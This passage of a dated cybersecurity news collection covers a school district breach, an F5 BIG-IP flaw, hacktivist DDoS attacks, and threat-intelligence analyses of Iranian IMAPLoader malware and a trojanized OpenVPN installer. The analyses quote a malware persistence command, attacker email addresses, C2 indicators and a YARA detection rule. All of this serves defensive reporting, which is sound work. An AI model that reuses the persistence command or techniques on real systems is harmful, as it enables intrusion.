      "text": " The Clark County School District (CCSD) in Nevada is dealing with a potentially massive data breach, as hackers email parents their children's' data that was allegedly stolen during a recent cyberattack.CCSD is the fifth largest school district in the US, with over 300,000 students and 15,000 teachers.On October 16, CCSD confirmed it suffered a cyberattack earlier this month, stating threat actors gained access to the district's email servers.\"Upon discovering the incident, CCSD immediately engaged a team of forensic experts to investigate the incident and ensure that CCSD operates within a safe and remediated email environment. CCSD is also cooperating with law enforcement's investigation.\"\"Thus far, the investigation revealed that the unauthorized party accessed limited personal information related to a subset of students, parents, and employees. CCSD is working diligently to identify all individuals whose information was impacted by this incident.\"In response to the attack, CCSD disabled access to its Google Workspace from external accounts and has forced reset all student's passwords.Since then, things have taken a turn for the worse, with parents reporting they are receiving emails from the threat actors warning that their child's data was leaked.\"There are over 200,000 student profiles like this which have been leaked now by the hackers. Be careful out there. Don't shoot the messenger!\"Both students and parents are upset and scared that the threat actor has their data and could potentially use it for other malicious purposes, such as identity theft or further phishing attacks.BleepingComputer contacted CCSD on Friday but did not receive a response as they were closed for the Nevada Day holiday.The threat actors contacted DataBreaches.net to share information about the attack, including a link to a \"statement\" that contains URLs for allegedly stolen data.\"We SingularityMD (the hack team), would like to make a statement for clarification. CCSD did not detect a security issue, we emailed them to tell them we had been in their network for a few months,\" reads a note by the hackers on a code-sharing site.\"For 6 years they forced students to use their birthday as their password, resetting the passwords back to their birth date each year, they even prevented the students from securing their accounts.\"\"We asked for less than one third of the Jesus F Jara's annual salary in exchange for destroying the stolen data. The callousness and incompetence of the leadership at CCSD is astounding, not only did they not cooperate, it is clear they did not communicate with principals and have still not plugged their leaky ship, meaning we still have access to the network.\"This note contains links to leaked data archives hosted on dark web and clearweb sites, containing what the hackers claim is the personal data of 200,000 students.This data allegedly contains student's emails, birth dates, ethnicity, PSAT scores, health information, suspensions, incident reports, and other information.The threat actors also leaked what they state are financial reports, staff salaries, and grant information from the district.However, parents who received some of the leaked data have already verified that the information belongs to their children, adding legitimacy to the leaks.At this time, the threat actors claim to still have access to CCSD's systems and have more data that they will leak if the school district does not pay an extortion demand.\"One final tip for CCSD, we will continue to cause trouble until you pay, or you finally kick us out of your network,\" concluded the threat actor's post.BleepingComputer has been unable to verify if the attacker's claims of still having access to CCSD systems are true.Furthermore, it should be noted that SingularityMD is not related to the AI platform under the same name."
   },
   {
      "time": "2023-10-30",
      "title": "Hacktivist Activity Related to Gaza Conflict Dwindles",
      "text": " Hacktivist cyber activities around the Israel-Hamas conflict have significantly slowed, with some groups no longer plotting such attacks and others focusing on targets outside Israel.A pro-Palestinian group, Dark Storm Team, posted claims in August 2023 on Dark Web forums that it would \"attack Israel infrastructure,\" and in early October, claimed to be preparing attacks against Israel's European allies. However, as of Oct. 20, it had reverted to promoting its DDoS-as-a-service options.In addition, the Persian language-speaking, pro-Palestinian hacktivist channel Solomon's Ring has not claimed an attack since Oct. 8. Despite being active since October 2022 and its claims of hacking and stealing data from an Israeli data center, there is no evidence of this nor of any leaks of that data.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-30",
      "title": "F5 fixes BIG-IP auth bypass allowing remote code execution attacks",
      "text": " A critical vulnerability in the F5 BIG-IP configuration utility, tracked as CVE-2023-46747, allows an attacker with remote access to the configuration utility to perform unauthenticated remote code execution.The flaw has received a CVSS v3.1 score of 9.8, rating it \"critical,\" as it can be exploited without authentication in low-complexity attacks.Threat actors can only exploit devices that have the Traffic Management User Interface (TMUI) exposed to the internet and do not affect the data plane. However, as the TMUI is commonly exposed internally, a threat actor who has already compromised a network could exploit the flaw.The affected BIG-IP versions are the following:CVE-2023-46747 does not impact the BIG-IP Next, BIG-IQ Centralized Management, F5 Distributed Cloud Services, F5OS, NGINX, and Traffix SDC products.Unsupported product versions that have reached EoL (end of life) have not been evaluated against CVE-2023-46747, so they may or may not be vulnerable. Due to the risks involved in using those versions, the recommendation is to upgrade to a supported version as soon as possible.The issue was discovered by Praetorian Security researchers Thomas Hendrickson and Michael Weber, who reported it to the vendor on October 5, 2023.F5 confirmed that it had reproduced the vulnerability on October 12 and published the security update along with the advisory on October 26, 2023.The recommended update versions that address the vulnerability are:F5 has also provided a script in the advisory to help administrators unable to apply the available security update to mitigate the problem.It should be noted that the script is only suitable for BIG-IP versions 14.1.0 and later. Also, caution is advised to those with a FIPS 140-2 Compliant Mode license, as the mitigation script can cause FIPS integrity check failures.To apply the mitigation using the F5-provided script, follow the below steps:VIPRION, vCMP guests on VIPRION, and BIG-IP tenants on VELOS must run the script individually on each blade. If a management IP address hasn't been assigned on each blade, you may connect to the serial console to run it.As F5 BIG-IP devices are used by governments, Fortune 500 firms, banks, service providers, and major consumer brands, it is strongly advised to apply any available fixes or mitigations to prevent the exploitation of these devices.Praetorian also warns that the Traffic Management User Interface should never be exposed to the internet in the first place."
   },
   {
      "time": "2023-10-30",
      "title": "IT Army of Ukraine disrupted internet providers in territories occupied by Russia",
      "text": " After the invasion of the Crimea and the eastern Ukraine, Ukrainian telecommunications infrastructure was disable by Russian soldiers. The hacktivists carried out DDoS attacks against the three Russian internet providers “Miranda-media,” “Krimtelekom,” and “MirTelekom.” The IT Army is inviting supporters to joint its operations by installing their software.“We continue targeting internet and telecom providers to disrupt enemy communications. Today, our intel orchestrated a “thousand proxies” strike, disabling “Miranda-media,” “Krimtelekom,” and “MirTelekom.” This affects not only Crimea but also occupied parts of Kherson, Zaporizhia, Donetsk, and Luhansk regions. Another blow by our cyber army disrupting enemy military communication at the frontlines.” reads the message published by the group IT Army of Ukraine on its Telegram channel.The Miranda Media ISP announced on Friday that is was facing a massive DDoS attack.“All technical and IT services of the company have been placed on high alert. All necessary measures are being taken to restore the network’s functionality. We will inform you further about the progress of the work.”Telecommunication infrastructure and internet services are critical infrastructure and were targeted by both Russian and Ukrainian threat actors.According to public sources, the threat actors targeted ICS of at least 11 Ukrainian telecommunications providers leading to the disruption of their services.\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-10-30",
      "title": "Yellow Liderc ships its scripts and delivers IMAPLoader malware\r\n",
      "text": " More Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu MenuFeaturedGlobal Consumer Insights Pulse Survey - June 2023Achieving net zero infrastructureManufacturing COO Pulse Survey Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu MenuFeaturedUkraine: Tax, Legal and People considerationsPwC Global Internal Audit Study 2023M&A industry trends report  Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu MenuFeaturedThe Leadership AgendaPwC’s Global Workforce Hopes and Fears Survey 2023strategy+business — a PwC publication Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu Menu MenuFeaturedThe New EquationPwC's Global Annual ReviewCommitting to Net Zero by 2030 Menu Menu MenuFeaturedThe New EquationPwC's Global Annual ReviewLoading ResultsNo Match FoundAuthor: PwC Threat IntelligenceSince 2019, PwC has tracked an Iran-based threat actor we refer to as Yellow Liderc (a.k.a. Imperial Kitten, Tortoiseshell, TA456, Crimson Sandstorm). As reported in our previous Year in Retrospect publications,1,2,3 this threat actor remains an active and persistent threat to many industries and countries, including the maritime, shipping and logistics sectors within the Mediterranean; nuclear, aerospace and defence industries in the US and Europe; and IT managed service providers in the Middle East.In this blog we will cover a recently-observed sample of malware linked to Yellow Liderc that has been used alongside strategic web compromises. The following are the key points of our analysis:Yellow Liderc is an Iran-based threat actor that has been active since at least 2018. As previously reported in our 2020 Year in Retrospect publication, Yellow Liderc is an Islamic Revolutionary Guard Corp. (IRGC) aligned threat actor, which focuses on targeting  Aviation, Automotive, Aerospace and Defense, Logistics, Maritime and Information Technology organisations. Geographically, the threat actor focuses on targeting organsiations throughout the Middle East, Europe, both North and South America and parts of South Asia. In 2021, open source reporting documented alleged connections between the threat actor and the IRGC,4 which also aligns with our previous reporting.5Yellow Liderc is known for a variety of tactics and techniques, including phishing, social engineering and strategic web compromises. The threat actor uses both custom and off-the-shelf malware including PowerShell backdoors and infostealers in order to gather information about victim systems. The threat actor has previously used macro enabled documents that drop a VBS script, commonly referred to as LEMPO, which establishes persistence, performs reconnaissance, and exfiltrates sensitive information. The threat actor often favours exfiltration of sensitive information to an actor-controlled email account via SMTPS or IMAP, and has been observed using both dedicated mailboxes and third party services for their email accounts.78Since 2022 Yellow Liderc has frequently compromised legitimate websites and inserted malicious JavaScript,9,10,11 often referred to as a watering hole attack or strategic web compromise. The JavaScript is used by the threat actor to fingerprint website visitors by capturing user location, device, time of visits, etc. The script enables the actor to infect specific user systems, matching a target fingerprint, with malware and gain access to the organisation’s network.This activity has heavily focused on the maritime, shipping and logistics sectors within the Mediterranean. Previous open source reporting has described some of this specific targeting by the threat actor.12,13 PwC has observed the following domains being actively used by Yellow Liderc throughout 2022 and 2023 in various watering hole attacks:In some attacks, the threat actor would serve malware to their targets upon visiting the infected websites because their fingerprints apparently indicated they could be a high value target. PwC observed a new sample of malware used in those later stages, which we have named IMAPLoader. We assess that IMAPLoader is a replacement to a Python-based IMAP implant the actor used in late 2021 and early 2022.14 The overall functionality is similar to past malware leveraged by the threat actor, but IMAPLoader uses a new injection technique not previously seen with Yellow Liderc, and is detailed below.\r\n The following sample is a DLL written in .NET and acts as a downloader, leveraging email communication as a means of command and control (C2) communication.FilenameStreamingUX.dllSHA-256989373f2d295ba1b8750fee7cdc54820aa0cb42321cec269271f0020fa5ea006File typeWin32 DLLFile size175,104 bytesCreated2022-12-18 12:27:50Figure 1 – Overview of IMAPLoader’s functionalityIn order to run, IMAPLoader uses an injection technique known as ‘AppDomain Manager Injection’,15 which was first publicly disclosed in a proof of concept in 2020. The injection forces a Microsoft .NET application to load a specially crafted .NET assembly (IMAPLoader in this case). Upon execution, IMAPLoader extracts the full path to itself, and makes the Windows Console Window that is created when the application is started hidden from view. This is achieved by directly importing the Windows DLLs kernel32.dll and user32.dll and calling the GetConsoleWindow and ShowWindow APIs respectively.The malware then queries the IMAP accounts (email addresses) hardcoded in the DLL which are both decimal encoded. These include two email addresses and passwords, which once decoded, show Yandex email addresses, a common email provider used by this threat actor:The malware then runs a WMI query to determine the operating system version, followed by scheduling tasks depending on the version identified. One of those tasks is to check for specific mailbox folders in a folder misspelled by the threat actor. Messages in the \"Recive\" folder are likely to contain further payloads as attachments. IMAPLoader proceeds to compile a list of unseen messages in this folder and prepare for attachment extraction via the hard coded Yandex email addresses.Depending on which Yandex account successfully logged in to, a new object imapClient3 is created which can interact with the remote email. By calling WMI class Win32_ComputerSystemProduct, IMAPLoader extracts the system UUID strings. This is later converted into a SHA-256 hash value and the first 21 characters (converted to uppercase) are used as an identifier in any further communication with the IMAP account. This likely indicates the Yandex accounts are intended for use across multiple victims, in contrast to their previous Python-based IMAP implant.The briefly mentioned extraction of attachments uses the Ux.Attachment method to return a dictionary object, where the first entry is the name of the attachment (stored as a string), and the second entry stores the raw attached file as a byte object. The attachment is subsequently stored in the same location on disk as IMAPLoader. We also observed in the code that there is a persistence mechanism via Ux.EditTask. This method ensures persistence on the system for the new retrieved payload, which we assess is likely to be a PE executable file. The method is used to edit the Windows task (previously created by IMAPLoader as StreamingUX Updater [version number]) by updating the path to point to the new payload.In the last chain of actions, the new payload is executed, by calling the ProcessStartInfo class. Finally, a new thread is created in the context of IMAPLoader which is used to fingerprint the system and exfiltrate collected content by sending an email to the same IMAP account used to retrieve the payload. While we have previously observed the threat actor developing .NET malware which uses similar email-based C2 channels and hard-coded commands to gain information about the victim's environment, IMAPLoader is executed via the 'AppDomain Manager Injection' technique, a technique we have not observed Yellow Liderc using before, which shows an evolution of this threat actors tools and techniques.We detected another sample from September 2022 which we assess is an earlier version of IMAPLoader:FilenamesaveImapMessage.exeSHA-25632c40964f75c3e7b81596d421b5cefd0ac328e01370d0721d7bfac86a2e98827File typeWin32 EXEFile size170,496 bytesCreated2101-11-11 01:04:26PDB pathF:\\vsp\\saveImapMessage\\saveImapMessage\\obj\\Debug\\saveImapMessage.pdbAlthough saveImapMessage.exe is an EXE file rather than a DLL, this shares a similar .NET file structure. It also contains the same functionality as our original sample (StreamingUX.dll) which in this case is located in a namespace called ‘downloader’. We also found a .NET DLL named JobTitle.dll which shares a partial PDB path with saveImapMessage.exe (F:\\\\vsp\\) and drops a version of IMAPLoader to the victim’s system. The infection chain for IMAPLoader is composed of three stages, using a decoy Excel document and legitimate Microsoft application for injection as seen in Figure 3.\nFigure 3 - Infection chain to deliver and execute IMAPLoaderThe first stage is distributed as an Excel-DNA XLL plugin,17 an open source library that enables .NET integration into Microsoft Excel files. One of its resources is called JOBTITLE which stores the 2nd stage component of the multi-part infection chain.As soon as JobTitle.dll is executed, it writes a C# source code file named source.cs to disk. This is subsequently compiled into a .NET DLL file called sign.dll, a version of IMAPLoader, by leveraging the native C# compiler tool csc.exe.Three additional files extracted by JobTitle.dll from its resources are also written to disk: a benign Microsoft Excel document, a modified Microsoft Windows application and an associated configuration file.The last DLL has the same functionality as discussed in the earlier StreamingUX.dll IMAPLoader analysis. The email addresses used for C2 communication also match our earlier analysis indicating the threat actor has likely reused its infrastructure for different victims. As per the previous sample, host fingerprinting is performed at every new payload execution, by creating a new process and executing cmd.exe with the same parameters as before.Pivoting on the strategic web compromise infrastructure shows links to infrastructure we assess is likely used by Yellow Liderc in their phishing operations. For example, both ztransportorganizationil[.]xyz and officemicrosoftsign[.]com shared a resolution at IP 138.124.183[.]100. Many similar domains can be identified from additional pivots made on this threat actor's infrastructure that have been active since at least 2022, such as the one shown in Figure 4. Figure 4 – Phishing page hosted on cheapfortest[.]storeAll of this assessed phishing activity is likely aimed at a wider target audience, rather than solely focused on the maritime or shipping sectors within the Mediterranean. Some of the domains are generically themed around Microsoft accounts which can be used against a wide variety of targets, while other domains are specifically aimed at the travel and hospitality sectors within Europe. In some cases, the threat actor is likely credential harvesting based on observations of the phishing pages being served. For example, Figure 5 below, shows a generic Microsoft login page that Yellow Liderc is using to trick targets into entering their credentials. It is assessed that the likely delivery method of this and similar domains described throughout are sent via spear phishing emails. Figure 5 – Phishing page hosted on loginlive[.]formsmicrosoftoffice[.]com[.]oauth2[.]liveIn other cases, malware is served to targets upon visiting the phishing website. For example, the threat actor served a macro-enabled Excel document that drops a VBScript. The use of macro-enabled documents that drop VBScripts is very similar to past Yellow Liderc activity which we have reported on privately,18 alongside open source reporting.19\nFilenameincome_statement1.xlsmSHA-2561a996d98ab897bbc3a0249ea43afaf841b31396be7cbe61b443a58d1c9aab071File typeXLSMFile size3,122,078 bytesCreated2011-05-30 Figure 6 – Macro-enabled document served visiting phishing websitesUpon opening, the macro-enabled Excel document contains a custom message requesting the user to enable macros. Once enabled, the user is presented with a decoy document. The macro itself writes several files to disk including a chain of scripts that set up a registry run key for persistence, a Python payload, and a local copy of Python 3.11.Filenamecln.tmpSHA-256cc7120942edde86e480a961fceff66783e71958684ad1307ffbe0e97070fd4fdFile typeTMPFile size4,384 bytesYellow Liderc is a highly persistent threat that remains active in targeting organisations with the described strategic compromise tactics and phishing activity. Analysis of IMAPLoader shows an evolution of the threat actor's tools which will likely continue to evolve, as the threat actor stays focused on targeting a variety of sectors and regions which align with its strategic interests.PwC recommends searching historical logs and configuring alerting for the indicators or detection content provided in this report. If any of these indicators are discovered, or detection content generates alerts, we recommend organisations investigate their origin and conduct forensic analysis. If there are no significant findings, we recommend blocking the provided malicious indicators.More detailed information on each of the techniques used in this report, along with detection and mitigations, can be found on the following MITRE pages:TacticTechniqueIDProcedureResource DevelopmentEstablish Accounts: Email AccountsThe threat actor uses Yandex accounts for its C2 communication.Resource DevelopmentDevelop Capabilities: MalwareWe assess IMAPLoader is a bespoke .NET malware developed by the threat actor.Resource DevelopmentCompromise InfrastructureT1584The threat actor compromises legitimate websites to host malicious files and scripts.ReconnaissanceGather Victim Host InformationT1592The threat actor fingerprints website visitors by capturing user location, device, and time of visits.Initial AccessDrive-by CompromiseT1189The threat actor compromises a legitimate website and injects some form of malicious code such as JavaScript.ExecutionCommand and Scripting Interpreter: JavaScriptT1059.007The threat actor uses JavaScript to execute fingerprint users or download and executing script files.ExecutionCommand and Scripting Interpreter: Windows Command ShellIMAPLoader issue commands to discover system, network and user information via cmd.exe.ExecutionUser Execution: Malicious FileThe macro-enabled document requires a user to open and interact with the file to execute the payload.PersistenceScheduled Task/Job: Scheduled TaskScheduled tasks are used to maintain persistence for payloads.PersistenceBoot or Logon Autostart Execution: Registry Run Keys / Startup FolderT1547.001The macro writes several files to disk including a script that establishes persistence with reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v StandardPS2Key /d %temp%\\hed.vbs /f.Defense EvasionMasquerading: Masquerade Task or ServiceTask name and author mimics legitimate Microsoft Windows services.Defense EvasionProcess Injection: Dynamic-link Library InjectionAn injection technique called AppDomain Manager Injection is used to load IMAPLoader.DiscoverySystem Information DiscoveryWMI commands are used to obtain OS version.DiscoverySystem Network Configuration DiscoveryBasic network information is obtained through ipconfig command.DiscoverySystem Owner/User DiscoveryBasic user information is obtained through whoami command.DiscoveryFile and Directory DiscoveryDirectory listings are run using dir command.Command and ControlApplication Layer Protocol: Mail ProtocolsThe threat actor uses IMAP protocols to communicate via email C2.ExfiltrationExfiltration Over C2 ChannelIMAPLoader exfiltrates the results of system, network and user commands to the C2.Type989373f2d295ba1b8750fee7cdc54820aa0cb42321cec269271f0020fa5ea006SHA-25632c40964f75c3e7b81596d421b5cefd0ac328e01370d0721d7bfac86a2e98827SHA-2563e3effa0388f362e891ccf6f9169f9fb9627698bea5fefa57084353603502886SHA-256528f4d63c5abcfd137569e2dda49b5730432fb189ef2263cd6e7222cbb6ccb75SHA-25691526246682b47e5f4e396130f2ff93943fbdcaf742262345fb35ae950f1d2b2SHA-25626881615e121584b8814916d2f0228de97439cf6b654fca58b2228ff893fcfbcSHA-25692687d1f47244d3a1d7b02fbccf389b9819fd7cc3a31036ae30c2d4d88a3f266SHA-2569fcb7dea92ad0fe5fa6d6a5a5bd47caea5d3bc44aee247a001fcefdc56500111SHA-2567bf2aaf5f82ba5ed834b6ee270e4a7326a191985ea6cc27bdaba17816d1f2ca9SHA-256d3677394cb45b0eb7a7f563d2032088a8a10e12048ad74bae5fd9482f0aead01SHA-256ebf2ec38ed0c4cd05aaae1bdb4af862294d8bd874f7830c42f6905e94de239cfSHA-2560ec131ca6fae327202577473137462086b3ce3130896fd8d8db69247ac720f04SHA-25687ccd1c15adc9ba952a07cd89295e0411b72cd4653b168f9b3f26c7a88d19b91SHA-256cc7120942edde86e480a961fceff66783e71958684ad1307ffbe0e97070fd4fdSHA-2561a996d98ab897bbc3a0249ea43afaf841b31396be7cbe61b443a58d1c9aab071SHA-256c43ae2eaa8b134861f4539b205bf97b4e6b3b857SHA-135be50f7f7f47abe64e555cae3088f40b7b3ebbeSHA-1a20e34f575dc2816088d8a6ae0dc9940bd229e95SHA-1065a43ffd414f62efd779af4bfb5b9e9290bb3f2SHA-148e30cd34178be36d7cfea2479361dd8280e726dSHA-1124d3cc91135766d4f93a5527bd323e1c23a3e2aSHA-101b4ed3e7d026f9b9038e93bb3313602256aaf2fSHA-15ceff2dbf7091c3906003bf5b77fd08deb71317eSHA-18d2a0b8b94a1a0fc1d357737d06809b8aac93165SHA-11860938bb192344df34b2ade9d804c91681d767dSHA-164c06102653cd94b67417160b1ec61f240cd4d78SHA-1afa40f62a1df6a3949f46a61055be043cf9ff55dSHA-1ed7e2cd95b442a290478ae750794f0c346de8e73SHA-10a3ec309299058c12a579c04d110001b77c311c5SHA-197d132f248bc95ea2810a816574756f6MD5e78142f546f2972117db1d8403d556beMD588ed93f824fbc5c73f7b47bf9d32b8e7MD5ee2de347c90c21e0e6917223c32ac61bMD5cb97310e5ca5ebc6a12358e97219487aMD56bfb2b02992de48a0242a7ff03623205MD56d02207c9ce1b3967077065c40eb1bb1MD5d009734407d38aac5735d182b0fffc86MD5366623939b90fdf277b43f457ac7b2edMD50df7bda8bfbb5828ca09fff7e70b34b8MD550516ccade993979b18d7896ff17c3c9MD5d9d153b162a8edab7841e9747a086e2cMD5a6b68493ace6398f95fc5720b1a16526MD520507d265a7495cc1e4ade1e8639666eMD5StreamingUX.dllFilenamesaveImapMessage.exeFilenameJobTitle.dllFilenamesign.dllFilenameStandardKeyboard.exeFilenameWindowsServiceLive.exeFilenameincome_statement1.xlsmFilenamecln.tmpFilenameleviblum[@]yandex.comEmail addressbrodyheywood[@]yandex.comEmail addresshardi.lorel[@]yandex.comEmail addressIndicatorTypecriticimfreedom[.]site Domainmegamodel[.]studioDomaininstructables[.]liveDomaininstructables[.]serviceDomainoutlookmicrosoftonline[.]comDomainnirsoft[.]appDomainnirsoft[.]inkDomainmentalfloss[.]liveDomainmyfridgefood[.]liveDomaintransportorganizationil[.]shopDomainmetatransfer[.]onlineDomainmsofficesign[.]comDomainfastanalytics[.]liveDomainprostatistics[.]liveDomainfastanalizer[.]liveDomaincdnpakage[.]comDomaineuropetourtravels[.]worldDomaineuropetourtravels[.]linkDomainoauth2[.]onlineDomainoauth2[.]liveDomainloginlive[.]formsmicrosoftoffice[.]com[.]oauth2[.]liveDomainlogin[.]microsoftonilne[.]com[.]oauth2[.]onlineDomain192.254.71[.]7 IPv4192.71.27[.]20IPv4193.182.144[.]68IPv4192.71.27[.]170IPv4195.20.17[.]237IPv4162.252.175[.]142 IPv464.46.102[.]11IPv4167.88.166[.]26 IPv4188.227.58[.]158 IPv4216.108.231[.]123 IPv479.132.128[.]169 IPv445.155.249[.]180IPv445.133.16[.]108  IPv438.60.136[.]253 IPv445.138.27[.]3 IPv4195.238.126[.]132 IPv494.131.114[.]48IPv4192.71.27[.]30IPv4193.182.144[.]185 IPv483.229.73[.]203IPv477.91.74[.]5IPv4178.23.190[.]74IPv494.131.114[.]23IPv4216.108.237[.]80IPv4104.238.156[.]70IPv4212.29.215[.]67IPv4212.150.236[.]253IPv4170.130.55[.]55 IPv41 PwC Cyber Threats 2020: A Year in Retrospect2 PwC Cyber Threats 2022: A Year in Retrospect3 PwC Cyber Threats 2022: A Year in Retrospect4 https://about.fb.com/news/2021/07/taking-action-against-hackers-in-iran/5 CTO-TIB-20210211-02A - Caught in a .NET6 https://www.proofpoint.com/uk/blog/threat-insight/i-knew-you-were-trouble-ta456-targets-defense-contractor-alluring-social-media7 CTO-TIB-20210211-02A - Caught in a .NET8 CTO-TIB-20220628-02A - Three varieties of Liderc9 CTO-TIB-20221208-01A - Yellow Liderc ships its scripts10 CTO-QRT-20230815-01A - Yellow Lidercs recent script activity11 CTO-QRT-20230418-01A - Yellow Liderc strikes again12 https://www.mandiant.com/resources/blog/suspected-iranian-actor-targeting-israeli-shipping13 https://www.clearskysec.com/fata-morgana/14 CTO-TIB-20220628-02A - Three varieties of Liderc15 ‘AppDomain Manager Injection: New Techniques For Red Teams’, Rapid7, https://www.rapid7.com/blog/post/2023/05/05/appdomain-manager-injection-new-techniques-for-red-teams/ (5th May 2023)16 GitHub, ‘netbiosX/GhostLoader’, https://github.com/netbiosX/Ghostloader17 Excel-DNA, ‘Excel-DNA’, https://excel-dna.net/18 CTO-TIB-20210730-01A - Eat, Sleep, Liderc, Repeat19  https://www.proofpoint.com/uk/blog/threat-insight/i-knew-you-were-trouble-ta456-targets-defense-contractor-alluring-social-media"
   },
   {
      "time": "2023-10-30",
      "title": "Higaisa APT Resurfaces via Phishing Website targeting Chinese Users — Cyble",
      "text": " Cyble Research and Intelligence Labs (CRIL) discovered a phishing website named “open-vpn[.]top” on October 16th. This deceptive site is designed to imitate the legitimate OpenVPN website. It is suspected to be associated with a new campaign initiated by an Advanced Persistent Threat (APT) group called Higaisa.Higaisa APT is believed to have South Korean origins and was initially disclosed by Tencent Security Threat Intelligence Center in early 2019. The group’s malicious activities can be traced back to at least 2016, involving the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Their targets encompass government officials, human rights organizations, and other entities associated with North Korea.Phishing websites are frequently utilized by Threat Actors (TAs) as their primary method for distributing malware. These TAs frequently employ brand impersonation in their phishing campaigns, adeptly tricking users into a false sense of trust and legitimacy, ultimately enticing unsuspecting individuals. Given the widespread use of VPNs by individuals to overcome online censorship, it is conceivable that these TAs are specifically targeting those seeking to evade such restrictions. The image below depicts the fraudulent OpenVPN website.The website hosted a malicious OpenVPN installer file, which is bundled with a genuine OpenVPN executable and a malicious Rust-based executable. Notably, the Rust-based executable has a valid digital signature. This digital signature is attributed to the Chinese organization “Zhiya Yunke (Chengdu) Finance and Tax Service Co., Ltd.,” as shown below.We have obtained a file named “OpenVPN.exe” from the phishing website. This file is a 32-bit Graphical User Interface-based executable.Upon execution of the file, it initiates a prompt for the user to choose their desired language, as shown in the figure below. It displays an installation wizard to proceed with the installation process.During the installation, the installer drops several files in the “C:\\Program Files (x86)\\OpenVPN” directory. These files consist of the genuine OpenVPN MSI installer (openvpn.msi), two legitimate runtime DLLs (vcruntime140.dll & vcruntime140Org.dll), and an additional malicious 64-bit console-based executable file written in the Rust programming language named “rom.exe,” which is a shellcode runner. Then, the installer file executes the malicious “rom.exe” file.The figure below shows the files dropped by the OpenVPN executable.When “rom.exe” is executed, the malware employs Windows APIs such as FindResource(), LoadResource(), and SizeofResource() to search for encrypted content stored within the executable’s resource section. Subsequently, it decrypts this content, which is a Shellcode and proceeds to execute it. The figure below shows the malware locating and executing the Shellcode.Upon execution, the Shellcode conducts an anti-debugging check by calculating a 32-bit hash of the current code section and subsequently comparing it to the original 32-bit hash of the code section. This check is designed to detect debugging attempts. When a debugger is in use, and a breakpoint is added, the debugger inserts the opcode “0xCC” at the location where the original opcode existed. This alteration to the opcode disrupts the original hash of the code section. If the hash does not match, the Shellcode terminates itself. The figure below shows the hash comparison.Subsequent to performing the anti-debugging operation, the malware proceeds secondary decryption of the Shellcode using a 16-byte XOR key and executes it, as shown in the figure below.After decryption, it creates a new thread with the purpose of generating a cryptographic session key. This key is intended to be sent to the C&C server to establish a secure communication channel.To generate the session key, the Shellcode initially utilizes the API function UUIDCreate(), which generates a 16-byte UUID (Universally Unique Identifier). This UUID will then be used for creating an AES encryption key. The code responsible for creating this UUID is depicted in the figure below.After generating the initial UUID, it proceeds to create an additional UUID. The last byte of the newly created UUID is typically used to generate a byte that will be used to compute a 32-bit hash using ROR and ADD-based instructions. This process is similar to the process used by shell code to compute hash at the time of anti-debugging operation. This hash is then passed to the CryptBinaryToStringA() API function for the purpose of generating Base64 encoded data using the second UUID, as shown in the figure below.The Shellcode employs the Windows Crypto API CryptCreateHash() to generate an MD5 hash using the first UUID. Subsequently, the Shellcode proceeds to create a second MD5 hash, this time of the previously generated hash. The figure below shows the routine for creating these hashes.Once the hashes are generated, the Shellcode proceeds to create a 128-bit AES encryption key using the CryptDeriveKey() function. The figure below shows the routine involved in creating this 128-bit AES key.The newly generated AES key is employed to enable encrypted communication with the C&C server. To establish a secure connection with the C&C server, the Shellcode utilizes a socket.Following the key initialization, the Shellcode initiates another thread, within which it establishes a socket connection and verifies the internet connectivity. To determine internet availability, the Shellcode evaluates connections to a predefined list of websites. If any of these websites can be reached, the Shellcode proceeds with additional operations. The figure below shows the routine containing hardcoded URLs.Following an internet connectivity check, the Shellcode initiates communication with the C&C server. To facilitate this communication, the Shellcode spawns additional threads. Specifically, it creates two additional threads that collaborate to manage the commands exchanged between the backdoor and the C&C server.The Shellcode creates a dispatch thread to handle the commands posted by the worker thread. The function of the dispatch thread is to create a message queue leveraging the PeekMessageW() API. Then, the worker thread proceeds to send the message ID alongside the command buffer to the message queue using the PostThreadMessageW() API.Once the dispatch thread receives a message from the worker thread, the message is then retrieved with the help of the GetMessageW() API.Based on the ID of the messages received, the command handler will accordingly receive the message. The figure below shows the dispatch thread.The shellcode is communicating to the IP 43.246.209[.]83 whose details are mentioned below:Upon establishing a successful connection with the C&C server, the attacker gains the ability to take control of the victim’s machine, perform malicious activities, and deploy additional malware, such as ransomware and others.CRIL also noticed three additional files engaged in communication with the C&C server, masquerading as GoogleMeet and ZoomInstaller.TAs often hide their malware payloads within genuine software installer files for various strategic reasons. This approach leverages the trust users have in legitimate software, increasing the likelihood of users willingly executing these files – believing them to be secure. Moreover, genuine software installers are frequently distributed through widely recognized channels, diminishing suspicion and boosting the chances of successful infiltration.In this case, TAs are concealing a shellcode runner within the legitimate OpenVPN software application. The analyzed Shellcode displays a high level of sophistication and presents a significant danger to unsuspecting users, largely due to the fact that the associated files possess valid digital signatures. This attribute significantly reduces the likelihood of detection at the time of writing this blog.Moreover, the manual nature of the malware’s operation suggests that the TAs are carefully selecting their targets for more precise and specific operations. This underscores the importance of user vigilance in light of the potential for further such attacks. Users should remain alert to the possibility of similar threats in the future.rule Higasia_APT{    meta:        author = “Cyble”        description = “Detects Higasia Loader”        date = “2023-10-26”        os = “Windows”        scan_type = “file”        severity = 90        reference_sample = “d329431aa23dba73214d1c104d01d57653fc59989a915337d1f92e6c7b56ac13”    strings:        $a = “MECHREVO”        $b = “\\\\shellcode_runner.pdb”        $c = “shellcode_runner\\\\”    condition:        uint16(0) == 0x5a4d and all of them}\n\t\t\t\tCyble Research Labs has discovered a new Android banking Trojan called Aberebot that targets banking customers of 140+ banks in 18 countries through phishing.\t\t\t\n\t\t\t\tA phishing campaign from a Twitter post. The Threat Actor (TA) hosts malicious Android APK files on a counterfeit version of Jamaat websites.\t\t\t"
   },
   {
      "time": "2023-10-27",
      "title": "\r\n\tCISA Releases Cybersecurity Toolkit For Healthcare - Infosecurity Magazine\r\n",
